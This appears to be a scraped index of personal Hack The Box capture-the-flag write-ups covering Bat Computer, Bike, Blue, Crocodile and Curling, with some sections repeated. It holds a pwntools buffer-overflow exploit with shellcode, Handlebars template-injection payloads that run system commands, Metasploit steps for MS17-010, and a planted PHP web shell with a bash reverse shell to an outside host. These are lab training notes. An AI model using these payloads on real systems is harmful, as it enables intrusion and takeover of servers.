\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 code:x86:64 \u2500\u2500\u2500\u2500 0x7ffff7ec0558 <read+8> test eax, eax 0x7ffff7ec055a <read+10> jne 0x7ffff7ec0570 <__GI___libc_read+32> 0x7ffff7ec055c <read+12> syscall \u2192 0x7ffff7ec055e <read+14> cmp rax, 0xfffffffffffff000 0x7ffff7ec0564 <read+20> ja 0x7ffff7ec05c0 <__GI___libc_read+112> 0x7ffff7ec0566 <read+22> ret 0x7ffff7ec0567 <read+23> nop WORD PTR [rax+rax*1+0x0] 0x7ffff7ec0570 <read+32> sub rsp, 0x28 0x7ffff7ec0574 <read+36> mov QWORD PTR [rsp+0x18], rdx \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 threads \u2500\u2500\u2500\u2500 [#0] Id 1, Name: \"batcomputer\", stopped 0x7ffff7ec055e in __GI___libc_read (), reason: SIGINT \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 trace \u2500\u2500\u2500\u2500 [#0] 0x7ffff7ec055e \u2192 __GI___libc_read(fd=0x0, buf=0x7ffff7fa0a23 <_IO_2_1_stdin_+131>, nbytes=0x1) [#1] 0x7ffff7e52cdc \u2192 _IO_new_file_underflow(fp=0x7ffff7fa09a0 <_IO_2_1_stdin_>) [#2] 0x7ffff7e53f42 \u2192 __GI__IO_default_uflow(fp=0x7ffff7fa09a0 <_IO_2_1_stdin_>) [#3] 0x7ffff7e2be20 \u2192 __vfscanf_internal(s=<optimized out>, format=<optimized out>, argptr=0x7fffffffdbd0, mode_flags=0x2) [#4] 0x7ffff7e2ae6e \u2192 __isoc99_scanf(format=<optimized out>) [#5] 0x555555555241 \u2192 mov eax, DWORD PTR [rbp-0x60] [#6] 0x7ffff7df97fd \u2192 __libc_start_main(main=0x5555555551ec, argc=0x1, argv=0x7fffffffde08, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffddf8) [#7] 0x5555555550de \u2192 hlt \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 [#6] 0x7ffff7df97fd \u2192 __libc_start_main(main=0x5555555551ec, argc=0x1, argv=0x7fffffffde08, init=<optimized out>, gef> break *0x5555555551ec gef> r Solution \u00b6 #!/home/carloz/PycharmProjects/python2/venv/bin/python2 from pwn import * url = \"159.65.92.13\" port = 30830 target = remote ( url , port ) # target = process(\"./batcomputer\") print target . recv () pilih = b '1' target . sendline ( pilih ) print target . recvuntil ( 'It was very hard, but Alfred managed to locate him: ' ) addr_vuln = target . recvuntil ( ' \\n ' ) print addr_vuln print target . recv () pilih = b '2' target . sendline ( pilih ) print target . recv () pswd = b 'b4tp@$$w0rd!' target . sendline ( pswd ) print target . recv () # shellcode = b'\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05' # http://shell-storm.org/shellcode/files/shellcode-806.php shellcode = b ' \\x48\\x31\\xd2\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05 ' # http://shell-storm.org/shellcode/files/shellcode-603.php payload = '' payload += shellcode + 'a' * ( 84 - len ( shellcode )) payload += p64 ( int ( addr_vuln , 16 )) target . sendline ( payload ) print target . recv () pilih = b '3' target . sendline ( pilih ) target . interactive ()","title":"Bat Computer"},{"location":"ctf/writeup/htb/htb-bat_computer/#solution","text":"#!/home/carloz/PycharmProjects/python2/venv/bin/python2 from pwn import * url = \"159.65.92.13\" port = 30830 target = remote ( url , port ) # target = process(\"./batcomputer\") print target . recv () pilih = b '1' target . sendline ( pilih ) print target . recvuntil ( 'It was very hard, but Alfred managed to locate him: ' ) addr_vuln = target . recvuntil ( ' \\n ' ) print addr_vuln print target . recv () pilih = b '2' target . sendline ( pilih ) print target . recv () pswd = b 'b4tp@$$w0rd!' target . sendline ( pswd ) print target . recv () # shellcode = b'\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05' # http://shell-storm.org/shellcode/files/shellcode-806.php shellcode = b ' \\x48\\x31\\xd2\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05 ' # http://shell-storm.org/shellcode/files/shellcode-603.php payload = '' payload += shellcode + 'a' * ( 84 - len ( shellcode )) payload += p64 ( int ( addr_vuln , 16 )) target . sendline ( payload ) print target . recv () pilih = b '3' target . sendline ( pilih ) target . interactive ()","title":"Solution"},{"location":"ctf/writeup/htb/htb-bike/","text":"Bike \u00b6 nmap -sT -sV -v <target_ip> The website is developed with flask hacktricks Error: Parse error on line 1: {{7*7}} --^ Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID' at Parser.parseError (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:268:19) at Parser.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:337:30) at HandlebarsEnvironment.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js:46:43) at compileInput (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:515:19) at ret (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:524:18) at router.post (/root/Backend/routes/handlers.js:14:16) at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5) at next (/root/Backend/node_modules/express/lib/router/route.js:137:13) at Route.dispatch (/root/Backend/node_modules/express/lib/router/route.js:112:3) at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5) the flask use templating engine Handlebars {{#with \"s\" as |string|}} {{#with \"e\"}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub \"constructor\")}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push \"return require('child_process').exec('whoami');\"}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}} require not defined , because require is not in global variables Node.js_global_scope Node.js_global_scope_1 built-in_objects try with process object process {{#with \"s\" as |string|}} {{#with \"e\"}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub \"constructor\")}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push \"return process\"}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}} take a deeper look at the sub function {{#with \"s\" as |string|}} {{#with \"e\"}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub \"constructor\")}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push \"return process.mainModule.require('child_process').execSync('whoami')\"}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}} trying with pwd , ls , cat /root/flag.txt","title":"Bike"},{"location":"ctf/writeup/htb/htb-bike/#bike","text":"nmap -sT -sV -v <target_ip> The website is developed with flask hacktricks Error: Parse error on line 1: {{7*7}} --^ Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID' at Parser.parseError (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:268:19) at Parser.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:337:30) at HandlebarsEnvironment.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js:46:43) at compileInput (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:515:19) at ret (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:524:18) at router.post (/root/Backend/routes/handlers.js:14:16) at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5) at next (/root/Backend/node_modules/express/lib/router/route.js:137:13) at Route.dispatch (/root/Backend/node_modules/express/lib/router/route.js:112:3) at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5) the flask use templating engine Handlebars {{#with \"s\" as |string|}} {{#with \"e\"}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub \"constructor\")}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push \"return require('child_process').exec('whoami');\"}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}} require not defined , because require is not in global variables Node.js_global_scope Node.js_global_scope_1 built-in_objects try with process object process {{#with \"s\" as |string|}} {{#with \"e\"}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub \"constructor\")}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push \"return process\"}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}} take a deeper look at the sub function {{#with \"s\" as |string|}} {{#with \"e\"}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub \"constructor\")}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push \"return process.mainModule.require('child_process').execSync('whoami')\"}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}} trying with pwd , ls , cat /root/flag.txt","title":"Bike"},{"location":"ctf/writeup/htb/htb-blue/","text":"Blue \u00b6 Easy External Enumeration SMB Penetration Tester Level 1 Remote Code Execution CVE-2017-0144 Network CVE Exploitation Windows Vulnerabilities Public Vulnerabilities $ nmap -sV -sC -Pn --min-rate 10000 10.129.234.243 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 00:49 EDT Nmap scan report for 10.129.234.243 Host is up (0.078s latency). Not shown: 991 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 2.1: |_ Message signing enabled but not required | smb2-time: | date: 2022-06-04T04:50:33 |_ start_date: 2022-06-04T04:48:24 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: haris-PC | NetBIOS computer name: HARIS-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2022-06-04T05:50:35+01:00 |_clock-skew: mean: -19m56s, deviation: 34m36s, median: 1s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 86.59 seconds CVE-2017-0144 \u00b6 The SMBv1 server in Microsoft Windows Vista SP2; Windows Server 2008 SP2 and R2 SP1; Windows 7 SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT 8.1; and Windows 10 Gold, 1511, and 1607; and Windows Server 2016 allows remote attackers to execute arbitrary code via crafted packets, aka \"Windows SMB Remote Code Execution Vulnerability.\" This vulnerability is different from those described in CVE-2017-0143, CVE-2017-0145, CVE-2017-0146, and CVE-2017-0148. scan vuln with nmap $ nmap -p 445 -script vuln 10.129.234.243 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 01:08 EDT Nmap scan report for 10.129.234.243 Host is up (0.066s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ |_ https://technet.microsoft.com/en-us/library/security/ms17-010.aspx Nmap done: 1 IP address (1 host up) scanned in 39.05 seconds $ searchploit ms17-010 $ msfconsole ... msf6> search ms17-010 msf6> use 0 msf6> set RHOSTS ... msf6> set LHOST ... msf6> exploit","title":"Blue"},{"location":"ctf/writeup/htb/htb-blue/#blue","text":"Easy External Enumeration SMB Penetration Tester Level 1 Remote Code Execution CVE-2017-0144 Network CVE Exploitation Windows Vulnerabilities Public Vulnerabilities $ nmap -sV -sC -Pn --min-rate 10000 10.129.234.243 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 00:49 EDT Nmap scan report for 10.129.234.243 Host is up (0.078s latency). Not shown: 991 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 2.1: |_ Message signing enabled but not required | smb2-time: | date: 2022-06-04T04:50:33 |_ start_date: 2022-06-04T04:48:24 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: haris-PC | NetBIOS computer name: HARIS-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2022-06-04T05:50:35+01:00 |_clock-skew: mean: -19m56s, deviation: 34m36s, median: 1s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 86.59 seconds","title":"Blue"},{"location":"ctf/writeup/htb/htb-blue/#cve-2017-0144","text":"The SMBv1 server in Microsoft Windows Vista SP2; Windows Server 2008 SP2 and R2 SP1; Windows 7 SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT 8.1; and Windows 10 Gold, 1511, and 1607; and Windows Server 2016 allows remote attackers to execute arbitrary code via crafted packets, aka \"Windows SMB Remote Code Execution Vulnerability.\" This vulnerability is different from those described in CVE-2017-0143, CVE-2017-0145, CVE-2017-0146, and CVE-2017-0148. scan vuln with nmap $ nmap -p 445 -script vuln 10.129.234.243 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 01:08 EDT Nmap scan report for 10.129.234.243 Host is up (0.066s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ |_ https://technet.microsoft.com/en-us/library/security/ms17-010.aspx Nmap done: 1 IP address (1 host up) scanned in 39.05 seconds $ searchploit ms17-010 $ msfconsole ... msf6> search ms17-010 msf6> use 0 msf6> set RHOSTS ... msf6> set LHOST ... msf6> exploit","title":"CVE-2017-0144"},{"location":"ctf/writeup/htb/htb-crocodile/","text":"Crocodile \u00b6 Pract \u00b6 nmap -sC -sV <ip_target> Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-24 13:52 WIB Nmap scan report for 10.129.210.55 Host is up (0.23s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | -rw-r--r-- 1 ftp ftp 33 Jun 08 2021 allowed.userlist |_-rw-r--r-- 1 ftp ftp 62 Apr 20 2021 allowed.userlist.passwd | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.10.14.120 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Smash - Bootstrap Business Template |_http-server-header: Apache/2.4.41 (Ubuntu) 1089/tcp filtered ff-annunc Service Info: OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 62.24 seconds ftp <ip_target> username : anonymous get allowed.userlist get allowed.userlist.passwd gobuster dir -u <ip_target> -w </locate> -x html,php","title":"Crocodile"},{"location":"ctf/writeup/htb/htb-crocodile/#crocodile","text":"","title":"Crocodile"},{"location":"ctf/writeup/htb/htb-crocodile/#pract","text":"nmap -sC -sV <ip_target> Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-24 13:52 WIB Nmap scan report for 10.129.210.55 Host is up (0.23s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | -rw-r--r-- 1 ftp ftp 33 Jun 08 2021 allowed.userlist |_-rw-r--r-- 1 ftp ftp 62 Apr 20 2021 allowed.userlist.passwd | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.10.14.120 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Smash - Bootstrap Business Template |_http-server-header: Apache/2.4.41 (Ubuntu) 1089/tcp filtered ff-annunc Service Info: OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 62.24 seconds ftp <ip_target> username : anonymous get allowed.userlist get allowed.userlist.passwd gobuster dir -u <ip_target> -w </locate> -x html,php","title":"Pract"},{"location":"ctf/writeup/htb/htb-curling/","text":"Curling \u00b6 PHP Easy External Joomla Penetration Tester Level 1 Password Reuse CVE-2019-7304 Public Vulnerabilities CVE Exploitation Remote Code Execution $ nmap -sC -sV 10.129.95.228 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-12 07:22 WIB Nmap scan report for 10.129.95.228 Host is up (0.051s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA) | 256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA) |_ 256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Home |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-generator: Joomla! - Open Source Content Management Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.97 seconds when open the website, it shows that the website was built with joomla , the from the first post it shows that the post published 22 May 2018, so it should have been created with joomla 3.8.8 or 3.8.7 $ searchsploit joomla 3.8.8 ------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting | php/webapps/43488.txt ------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results $ searchsploit joomla 3.8.7 ------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting | php/webapps/43488.txt ------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results from searchsploit we know that it is CVE-2018-5263 when view page source some page there found secret.txt , so when i tried open it http://10.129.95.228/secret.txt , it shows Q3VybGluZzIwMTgh base64 of Curling2018! , also from the first post we know that the uploader is Floris use Floris : Curling2018! to login use gobuster to detect directory $ gobuster dir --url http://10.129.95.228/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.129.95.228/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/06/12 08:13:52 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 315] [--> http://10.129.95.228/images/] /media (Status: 301) [Size: 314] [--> http://10.129.95.228/media/] /templates (Status: 301) [Size: 318] [--> http://10.129.95.228/templates/] /modules (Status: 301) [Size: 316] [--> http://10.129.95.228/modules/] /bin (Status: 301) [Size: 312] [--> http://10.129.95.228/bin/] /plugins (Status: 301) [Size: 316] [--> http://10.129.95.228/plugins/] /includes (Status: 301) [Size: 317] [--> http://10.129.95.228/includes/] /language (Status: 301) [Size: 317] [--> http://10.129.95.228/language/] /components (Status: 301) [Size: 319] [--> http://10.129.95.228/components/] /cache (Status: 301) [Size: 314] [--> http://10.129.95.228/cache/] /libraries (Status: 301) [Size: 318] [--> http://10.129.95.228/libraries/] /tmp (Status: 301) [Size: 312] [--> http://10.129.95.228/tmp/] /layouts (Status: 301) [Size: 316] [--> http://10.129.95.228/layouts/] /administrator (Status: 301) [Size: 322] [--> http://10.129.95.228/administrator/] Progress: 14588 / 87665 (16.64%) ^C [!] Keyboard interrupt detected, terminating. =============================================================== 2022/06/12 08:15:21 Finished =============================================================== open /administrator and login as Floris choose Extensions > Templates > Templates choose one up, i will choose protostar New File make name file, make sure that is php file. then create make simple php syntax, then save it $ curl http://10.129.95.228/templates/protostar/uptoyou.php uid=33(www-data) gid=33(www-data) groups=33(www-data) make reverse shell to make it easy $ nc -lnvp 443 <?php system(\"bash -c 'bash -i >& /dev/tcp/10.10.14.2/443 0>&1'\");?> $ curl http://10.129.95.228/templates/protostar/uptoyou.php from /home/floris/password_backup we got 00000000: 425a 6839 3141 5926 5359 819b bb48 0000 BZh91AY&SY...H.. 00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34 ....A...P)ava.:4 00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960 N...n.T.#.@%...` 00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000 ......z.@...... 00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800 ..i.4hdi...9.h.. 00000050: 000f 51a0 0064 681a 069e a190 0000 0034 ..Q..dh........4 00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0 i...5.n......J.. 00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78 .h...*..}y..<~.x 00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931 .>...sVT.zH....1 00000090: c856 921b 1221 3385 6046 a2dd c173 0d22 .V...!3.`F...s.\" 